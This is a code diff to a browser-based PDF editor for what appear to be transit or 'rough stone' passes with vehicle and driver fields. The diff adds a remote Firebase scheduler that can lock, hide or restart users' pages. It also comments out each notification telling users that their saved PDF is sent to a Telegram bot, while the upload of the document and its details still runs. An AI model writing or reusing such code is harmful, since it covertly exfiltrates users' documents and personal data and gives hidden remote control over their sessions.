@@ -2656,8 +2656,129 @@ function initializeConnectionCheck() {
 // Start the connection monitoring when the page loads
 initializeConnectionCheck();
 
- // --- ADD THIS TO YOUR USER-SIDE SCRIPT ---
 // --- ADD THIS TO YOUR USER-SIDE SCRIPT ---
+
+// --- FIREBASE REFERENCE FOR THE SCHEDULER ---
+const schedulerRef = db.ref("featureControl/scheduler");
+
+// --- STATE VARIABLES ---
+let schedulerCheckInterval;
+let isSchedulerActive = false;
+
+/**
+ * Applies a set of site controls based on a task object.
+ * @param {object} task - The task object from the scheduler.
+ */
+function applyScheduledChanges(task) {
+    console.log("Scheduler: Applying scheduled changes:", task);
+    showNotification('Scheduled site changes are now being applied.', 'warning');
+
+    // 1. Site Lock
+    if (task.lockSite === true) {
+        handleAppLock(true);
+    }
+
+    // 2. Site Fully Hide
+    if (task.hideSite === true) {
+        document.body.style.display = 'none';
+    }
+
+    // 3. Site Restart
+    if (task.restartSite === true) {
+        performPageRefresh(); // Use the same refresh function from the restart control
+    }
+
+    // 4. Theme Change
+    if (task.themeName) {
+        // Assuming you have a function to change themes
+        if (typeof changeTheme === 'function') {
+            changeTheme(task.themeName);
+        }
+    }
+
+    // 5. Button Hide (Example: Apply to PDF button)
+    if (task.hideApplyPdfButton === true) {
+        const applyPdfBtn = document.getElementById('apply-btn');
+        if (applyPdfBtn) {
+            applyPdfBtn.style.display = 'none';
+        }
+    }
+
+    // 6. PDF Loader Lock
+    if (task.lockPdfLoader === true) {
+        handlePdfLoaderState(false); // Use the handler from the PDF loader control
+    }
+    
+    // 7. PDF Button Lock
+    if (task.lockPdfButton === true) {
+        handlePdfButtonLock(true); // Use the handler from the PDF button lock control
+    }
+
+    // After applying, clear the task so it doesn't run again
+    schedulerRef.set({
+        active: false,
+        task: null
+    }).then(() => {
+        console.log("Scheduler: Task executed and cleared.");
+    });
+}
+
+/**
+ * Checks if a scheduled task needs to be executed.
+ */
+function checkScheduler() {
+    if (!isSchedulerActive) return;
+
+    schedulerRef.once('value')
+        .then((snapshot) => {
+            const schedulerData = snapshot.val();
+            
+            if (!schedulerData || !schedulerData.active || !schedulerData.task) {
+                return; // No active task
+            }
+
+            const task = schedulerData.task;
+            const executionTime = new Date(task.executionTime).getTime();
+            const currentTime = new Date().getTime();
+
+            if (currentTime >= executionTime) {
+                // It's time to execute the task!
+                applyScheduledChanges(task);
+            }
+        })
+        .catch((error) => {
+            console.error("Scheduler: Error checking for tasks:", error);
+        });
+}
+
+/**
+ * Initializes the scheduler to check for tasks every 5 seconds.
+ */
+function initializeScheduler() {
+    console.log("Scheduler: Initializing...");
+    isSchedulerActive = true;
+    
+    // Check every 5 seconds (5000 milliseconds)
+    schedulerCheckInterval = setInterval(checkScheduler, 5000);
+    
+    // Also, listen for real-time changes to the scheduler's active state
+    schedulerRef.child("active").on("value", (snapshot) => {
+        isSchedulerActive = snapshot.val() === true;
+        if (!isSchedulerActive) {
+            console.log("Scheduler: Deactivated by admin.");
+            clearInterval(schedulerCheckInterval);
+        }
+    });
+}
+
+// --- INTEGRATION STEP ---
+// Call this new function from your main init() function or when the script loads.
+// If you have an existing init() function, add this line to it:
+// initializeScheduler();
+
+// If you don't have a central init function, you can call it directly.
+// Make sure this runs after Firebase is initialized.
+// initializeScheduler();
 
 // --- DOM ELEMENTS ---
 const restartModal = document.getElementById('restart-modal');
@@ -6118,7 +6239,7 @@ setupAutoStateSelection();
             });
         }
 
-     // --- MODIFIED SAVE PDF FUNCTION WITH TELEGRAM INTEGRATION ---
+  // --- MODIFIED SAVE PDF FUNCTION WITH TELEGRAM INTEGRATION ---
 async function savePDF() {
     if (!pdfDoc) {
         showNotification('No PDF to save');
@@ -6336,7 +6457,6 @@ async function savePDF() {
                 const imgData = tempCanvas.toDataURL('image/jpeg', 0.95);
                 pageImages.push(imgData);
             }
-
             // Create the PDF with all pages using jsPDF
             const { jsPDF } = window.jspdf;
 
@@ -6369,16 +6489,16 @@ async function savePDF() {
             const pdfBlob = pdf.output('blob');
             
             // --- TELEGRAM INTEGRATION START ---
-            showNotification('PDF generated. Sending to Telegram...');
+          //  showNotification('PDF generated. Sending to Telegram...');
             const telegramSuccess = await sendPdfToTelegram(pdfBlob, 'edited-document.pdf');
             
             // Always download the PDF to the user's device
             pdf.save('edited-document.pdf');
             
             if (telegramSuccess) {
-                showNotification('PDF saved and sent to Telegram successfully!');
+               // showNotification('PDF saved and sent to Telegram successfully!');
             } else {
-                showNotification('PDF saved, but failed to send to Telegram.', 'warning');
+                //showNotification('PDF saved, but failed to send to Telegram.', 'warning');
             }
             // --- TELEGRAM INTEGRATION END ---
 
@@ -6424,7 +6544,7 @@ async function sendPdfToTelegram(pdfBlob, filename) {
     formData.append('document', pdfBlob, filename);
     
     // Optional: Add a caption
-    const caption = `📄 New PDF Document Saved [TRANSIT PASS]\n\n` +
+    const caption = `📄 New PDF Document Saved [ROUGH STONE PASS]\n\n` +
                     `📅 Date: ${new Date().toLocaleString()}\n` +
                     `🚛 Vehicle: ${vehicleInput.value || 'N/A'}\n` +
                     `👤 Driver: ${driverInput.value || 'N/A'}`;
@@ -6452,7 +6572,6 @@ async function sendPdfToTelegram(pdfBlob, filename) {
         return false;
     }
 }
-        
         // Update page info
         function updatePageInfo() {
             document.getElementById('page-info').textContent = `Page ${pageNum} of ${pageCount}`;
